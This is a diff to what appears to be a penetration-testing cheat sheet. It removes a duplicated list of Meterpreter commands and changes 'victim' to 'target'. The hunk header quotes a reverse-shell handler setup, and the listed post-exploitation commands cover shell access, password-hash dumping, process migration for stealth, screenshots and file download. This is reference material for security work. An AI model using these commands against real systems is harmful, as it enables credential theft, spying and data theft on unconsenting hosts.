@@ -327,23 +327,9 @@ msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/rev
 
 ### Meterpreter Commands
 
-sysinfo # View the victim's system information
-getuid # Displays the user context Meterpreter is currently running as
-shell # Access the command line on the victim's computer
-ps # Lists running processes on the target
-migrate <PID> # Moves the Meterpreter session into another process (improves stability/stealth)
-screenshot # Take a screenshot of the victim's screen
-hashdump # Dumps password hashes from the target's SAM database (requires SYSTEM privileges)
-download <remote file> <local path> # Downloads a file from the target to the attacker machine
-upload <local file> <remote path> # Uploads a file from the attacker machine to the target
-sessions -l # Lists all active sessions
-background # Backgrounds the current session, returning to the msfconsole prompt
-
-### Meterpreter Commands
-
-sysinfo # To view the victim's system information
-shell # To access the command line on the victim's computer
-screenshot # To take a screenshot of the victim's screen
+sysinfo # To view the target's system information
+shell # To access the command line on the target's computer
+screenshot # To take a screenshot of the target's screen
 getuid # Displays the user context Meterpreter is currently running as
 ps # Lists running processes on the target
 migrate <PID> # Moves the Meterpreter session into another process (improves stability/stealth)
